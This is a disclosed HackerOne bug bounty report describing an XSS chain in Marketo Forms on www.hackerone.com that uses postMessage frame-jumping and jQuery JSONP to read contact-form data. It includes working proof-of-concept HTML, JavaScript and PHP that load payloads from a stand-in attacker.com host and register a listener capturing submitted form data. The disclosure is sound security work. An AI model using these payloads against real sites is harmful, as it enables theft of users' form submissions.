# Stealing contact form data on www.hackerone.com using Marketo Forms XSS with postMessage frame-jumping and jQuery-JSONP

## Report Details
- **Report ID**: 207042
- **URL**: https://hackerone.com/reports/207042
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-02-17T04:18:23.540Z
- **Disclosed**: 2017-08-29T14:58:40.288Z

## Reporter
- **Username**: fransrosen
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
Hi,

I just discovered that there's a scenario where the Marketo Forms solution being used on www.hackerone.com can actually be abused, using a few fun techniques, to trigger an XSS in the Cross-Origin-iframe being used by Marketo. This results in eavesdropping of the data being sent in the contact-form on www.hackerone.com.

What also made this nice on HackerOne was the auto-trigger to launch the contact form without any interaction using the `#contact`-fragment:

```js
 if(/^#contact/.test(window.location.hash) === true) {
    LoadContactForm();
 }
```

### PoC

My PoC looks like this:

███

PoC-link is here, it will popup alert when form is submitted with the data:
https://█████/marketo2.html 

Only an annoying alert: 
https://████████/marketo.html

### Technical details

So, let's dig down what actually happens here.

#### Marketo cross domain AJAX request window

Marketo uses an iframe that is located here (the `sj17` is just a specific instance on Marketo, this one differs between customers):

https://app-sj17.marketo.com/index.php/form/XDFrame

This page contains a `postMessage`-listener to launch an ajax-call:

```js
if(!window.parent || window.parent == window){
  return;
}
$(window).on("message", function (e){
  ...
  if(message && message.mktoRequest && message.mktoRequest.ajaxParams){
    var params = message.mktoRequest.ajaxParams;
    ...
    $.ajax(params);
```

First, as you see, the window will not work without any window parent. If it's framed, it'll start the listener. Passing arbitrary parameters to `$.ajax` is bad. Sending the following payload as the `ajaxParams`:

```
{"url":"https://attacker.com/jsonp.php","dataType":"jsonp","method":"get"}
```

Having the following content on the `jsonp.php`-endpoint:

```
<?
header("Access-Control-Allow-Origin: *");
?>
alert(document.domain)
```

Will result in an XSS on this marketo.com-domain.

#### postMessage passing

Since no origins are being used here, we can just pass any messages we like, from wherever we like.

To abuse this on www.hackerone.com we need to do the following:

1. Create our springboard page which will have an iframe of the `XDFrame` for Marketo:

```html
<iframe id="x" name="x" border="0" frameborder="0" width="100" height="30" src="https://app-sj17.marketo.com/index.php/form/XDFrame"></iframe>
```

2. We listen to the message we get from the iframe to trigger our payload and we send back a `postMessage` loading a JSONP-endpoint with a function to create a link to www.hackerone.com with the `#contact` fragment:

```html
<script>
var run = false
var b
window.onmessage=function() {
	if(!run)
	x.postMessage('{"mktoRequest":{"ajaxParams":{"url":"https://attacker.com/jsonp.php","dataType":"jsonp","method":"get"}}}', '*')
	run = true
}
</script>
```

This is the content of `jsonp.php`:

```php
<?
header("Access-Control-Allow-Origin: *");
?>
(function(){
document.body.innerHTML='<a href="#" onclick="window.b=window.open(\'https://www.hackerone.com/product/overview#contact\',\'b\',\'\')">Click me!</a>'

setInterval(function() {
try {
	b['frames'][0].postMessage('{"mktoRequest":{"ajaxParams":{"url":"https://attacker.com/jsonp2.php","dataType":"jsonp","method":"get"}}}', '*')
} catch(e){}
}, 1000);
})()
```

When victim clicks the link, we start a interval of `postMessage`-sending to `b['frames'][0]` which should be the Marketo iframe on www.hackerone.com. Interesting enough, Marketo actually sets the name of the frame to `mktoFormsXDIframe + Math.random()` but this can be completely bypassed using `window['frames'][0]` instead.

Our code in `jsonp2.php` looks like this:

```php
<?
header("Access-Control-Allow-Origin: *");
?>
(function(){
	if(window.icanhazmsg) return
	window.icanhazmsg=true
	window.onmessage=function(a) {
		if(a.origin.indexOf('marketo') !== -1) return;
		console.log(a);
		alert("I HAVE YOUR DATA NOW\n" + a.data)
	}
})()
```

As you see, we now use the XSS passed from our springboard-iframe to the iframe on www.hackerone.com to register a listener to pop an alert when data is submitted in the form.

Getting the victim to submit the form, will result in the infamous popup:

████

So, what we did was the following:

1. Attacker's page -> Marketo iframe
2. postMessage from Marketo iframe -> Attacker's page
3. Attacker's page -> postMessage loading JSONP -> Marketo iframe
4. Create link on Marketo iframe -> start sending postMessage
5. Link opens www.hackerone.com in new tab, triggers contact form to show using `#contact`
6. Sends over postMessage from opener. XSS register listener in Marketo iframe
7. Victim submits form, XSS reads data
  

### Conclusion

I played around a bit with this issue and came to the following conclusion:

1. Marketo Forms doesn't use any origin-checks of the postMessage sent to their Cross Origin Frame. This is most likely because the whole point with the frame is to communicate with any page that uses Marketo. This is probably per design.
2. Marketo Forms allows a bit too much flexibility for the page sending the postMessage. It's actually just throwing in a complete object called `ajaxParams` directly into `$.ajax()`. This results in the XSS on `app-*.marketo.com`. I think this is the best thing to patch up properly, not allowing full control over these params, especially not the `jsonp`-mode of jQuery.
3. In HackerOne's case, no data is handled sent from the `error` and `success` functions being triggered when the form is posted which most likely saves HackerOne from getting a proper XSS on their own domain. However, since the data submitted in the form is still passed through the iframe, data can still be stolen using this technique.

Regards,
Frans

## Attachments
No attachments
